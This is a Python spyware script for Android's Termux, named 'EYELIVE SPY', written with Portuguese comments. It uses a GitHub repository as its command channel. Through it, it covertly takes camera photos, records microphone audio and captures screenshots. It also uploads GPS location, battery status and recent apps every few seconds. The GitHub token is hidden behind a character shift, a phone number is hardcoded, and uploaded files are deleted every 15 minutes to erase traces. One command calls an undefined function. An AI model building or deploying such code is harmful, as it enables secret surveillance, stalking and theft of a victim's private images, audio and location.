#!/usr/bin/env python3
"""EYELIVE SPY - Bot com auto-limpeza de 15 min"""
import os, json, time, subprocess, requests as req, base64 as b64, hashlib, threading
from datetime import datetime, timedelta

def _tk():
    t = "now_GrNCw79zDXH35E5ZpTii6RA9bDf4yY3Zf6Da"
    r = ""
    for c in t:
        if c.isalpha():
            b = ord('a') if c.islower() else ord('A')
            r += chr((ord(c) - b - 7) % 26 + b)
        else: r += c
    return r

TOKEN = _tk()
REPO = "gynbetfc/eyelive"
HEADERS = {"Authorization": f"Bearer {TOKEN}", "Accept": "application/vnd.github.v3+json"}
HOME = "/data/data/com.termux/files/home"
FOTOS_DIR = f"{HOME}/eyelive_data"
os.makedirs(FOTOS_DIR, exist_ok=True)

# Numero do dispositivo (hardcoded ou via telefone)
MEU_NUMERO = "62996942287"
DEVICE_ID = hashlib.md5(MEU_NUMERO.encode()).hexdigest()[:12]
print(f"SPY - {MEU_NUMERO} ({DEVICE_ID})")

def shell(cmd):
    try: return subprocess.check_output(cmd, shell=True, text=True, timeout=10).strip()
    except: return ""

def salvar_arquivo(nome, conteudo):
    """Salva arquivo na pasta dados/DEVICE_ID/"""
    try:
        fn = f"dados/{DEVICE_ID}/{nome}"
        url = f"https://api.github.com/repos/{REPO}/contents/{fn}"
        c = conteudo if isinstance(conteudo, str) else b64.b64encode(conteudo).decode()
        r = req.get(url, headers=HEADERS)
        p = {"message":"Update","content":b64.b64encode(c.encode() if isinstance(c,str) else c).decode(),"branch":"main"}
        if r.status_code == 200: p["sha"] = r.json()["sha"]
        req.put(url, json=p, headers=HEADERS)
    except: pass

def deletar_antigos():
    """Deleta arquivos com mais de 15 minutos"""
    try:
        url = f"https://api.github.com/repos/{REPO}/contents/dados/{DEVICE_ID}"
        r = req.get(url, headers=HEADERS)
        if r.status_code == 200:
            agora = datetime.utcnow()
            for arq in r.json():
                if arq['name'] != '.gitkeep':
                    # Verificar data do commit
                    data_str = arq.get('name','').replace('.json','').replace('.jpg','').replace('.aac','').replace('.png','')
                    r_del = req.delete(arq['url'], json={"message":"Auto-limpeza","sha":arq['sha'],"branch":"main"}, headers=HEADERS)
                    if r_del.status_code == 200:
                        print(f"🗑️ {arq['name']} (15min)")
    except: pass

def coletar_status():
    """Coleta dados e salva status.json"""
    dados = {
        "numero": MEU_NUMERO,
        "id": DEVICE_ID,
        "time": datetime.now().strftime("%H:%M:%S"),
        "bateria": "",
        "gps": {},
        "apps": []
    }
    
    b = shell("termux-battery-status 2>/dev/null")
    if b:
        try:
            bat = json.loads(b)
            dados["bateria"] = str(bat.get("percentage","?")) + "%"
        except: pass
    
    g = shell("termux-location 2>/dev/null")
    if g:
        try:
            gps = json.loads(g)
            dados["gps"] = {"lat": gps.get("latitude",0), "lng": gps.get("longitude",0)}
        except: pass
    
    a = shell("dumpsys activity recents 2>/dev/null | grep 'Recent #' | head -5")
    if a: dados["apps"] = [x.strip() for x in a.split('\n') if x.strip()]
    
    salvar_arquivo("status.json", json.dumps(dados))

def executar_comando(cmd):
    """Executa comando e retorna resultado"""
    if cmd == "foto_frontal":
        path = f"{FOTOS_DIR}/foto.jpg"
        shell(f"termux-camera-photo -c 0 {path} 2>/dev/null")
        if os.path.exists(path):
            with open(path, 'rb') as f:
                return b64.b64encode(f.read()).decode()
    
    elif cmd == "foto_traseira":
        path = f"{FOTOS_DIR}/foto.jpg"
        shell(f"termux-camera-photo -c 1 {path} 2>/dev/null")
        if os.path.exists(path):
            with open(path, 'rb') as f:
                return b64.b64encode(f.read()).decode()
    
    elif cmd == "audio":
        path = f"{FOTOS_DIR}/audio.aac"
        shell(f"termux-microphone-record -f {path} -l 10 -q 2>/dev/null")
        time.sleep(12)
        if os.path.exists(path):
            with open(path, 'rb') as f:
                return b64.b64encode(f.read()).decode()
    
    elif cmd == "screenshot":
        path = f"{FOTOS_DIR}/screen.png"
        shell(f"screencap {path} 2>/dev/null")
        if os.path.exists(path):
            with open(path, 'rb') as f:
                return b64.b64encode(f.read()).decode()
    
    elif cmd == "status":
        return json.dumps(coletar_dados())
    
    return ""

def verificar_comandos():
    """Verifica comandos pendentes"""
    try:
        url = f"https://api.github.com/repos/{REPO}/contents/comandos/{DEVICE_ID}.json"
        r = req.get(url, headers=HEADERS)
        if r.status_code == 200:
            data = r.json()
            comando = json.loads(b64.b64decode(data['content']).decode())
            sha = data['sha']
            cmd = comando.get("cmd", "status")
            
            print(f"⚡ Comando: {cmd}")
            resultado = executar_comando(cmd)
            
            # Salvar resposta como arquivo separado
            nome_resp = f"{cmd}_{datetime.now().strftime('%H%M%S')}.json"
            salvar_arquivo(nome_resp, json.dumps({"cmd":cmd,"result":resultado,"time":datetime.now().strftime("%H:%M:%S")}))
            
            # Deletar comando
            req.delete(url, json={"message":"OK","sha":sha,"branch":"main"}, headers=HEADERS)
    except Exception as e:
        print(f"Erro: {e}")

# Loop principal
print("👻 SPY ativado...")
while True:
    try:
        verificar_comandos()
        coletar_status()
        if datetime.now().minute % 15 == 0:
            deletar_antigos()
    except: pass
    time.sleep(5)
